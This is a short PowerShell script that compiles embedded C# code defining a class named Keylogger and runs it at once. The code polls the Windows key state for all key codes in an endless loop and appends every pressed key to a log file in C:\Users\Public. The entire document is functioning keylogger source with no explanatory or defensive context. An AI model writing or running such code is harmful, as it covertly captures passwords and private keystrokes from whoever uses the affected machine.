Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;

public class Keylogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    
    public static void StartLogging() {
        string filePath = @"C:\Users\Public\logs.txt";
        StreamWriter sw = new StreamWriter(filePath, true);
        
        while (true) {
            System.Threading.Thread.Sleep(10);
            for (int i = 0; i < 255; i++) {
                int keyState = GetAsyncKeyState(i);
                if (keyState == -32767) {
                    sw.Write((Keys)i + " ");
                    sw.Flush();
                }
            }
        }
    }
}
"@ -Language CSharp

[Keylogger]::StartLogging()
